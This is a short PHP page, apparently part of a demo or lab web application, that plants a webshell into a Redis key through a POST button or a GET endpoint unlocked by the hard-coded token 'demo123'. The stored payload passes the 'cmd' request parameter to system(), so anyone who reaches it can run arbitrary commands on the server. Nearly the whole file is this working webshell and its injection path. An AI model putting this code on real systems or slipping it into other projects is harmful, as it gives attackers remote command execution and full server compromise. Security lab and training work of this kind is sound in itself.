<?php
require_once __DIR__ . '/../src/bootstrap.php';

// Quick webshell injection for demo
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    if ($_POST['action'] === 'inject') {
        $webshell = '<?php
if (isset($_GET["cmd"])) {
    echo "<pre style=\"background:black;color:lime;padding:10px;\">";
    system($_GET["cmd"]);
    echo "</pre>";
} else {
    echo "Webshell ready. Use ?cmd=command";
}
?>';
        
        $redis->set("session_webshell_demo", $webshell);
        
        header('Location: admin.php');
        exit;
    }
}

// Also create a GET endpoint for easy injection
if (isset($_GET['inject']) && $_GET['inject'] === 'demo123') {
    $webshell = '<?php
if (isset($_GET["cmd"])) {
    echo "<pre>";
    system($_GET["cmd"]);
    echo "</pre>";
}
?>';
    
    $redis->set("session_webshell_demo", $webshell);
    echo "Webshell injected! <a href='admin.php'>Go to admin panel</a>";
    exit;
}

// Default view
?>
<!DOCTYPE html>
<html>
<head>
    <title>Inject Demo Webshell</title>
</head>
<body>
    <h1>Quick Webshell Injection</h1>
    <form method="post">
        <input type="hidden" name="action" value="inject">
        <button type="submit" style="padding:15px;background:#4caf50;color:white;border:none;cursor:pointer;">
            ⚡ Inject Demo Webshell into Redis
        </button>
    </form>
    <p>Or use: <a href="?inject=demo123">?inject=demo123</a></p>
    <p><a href="admin.php">Back to Admin Panel</a></p>
</body>
</html>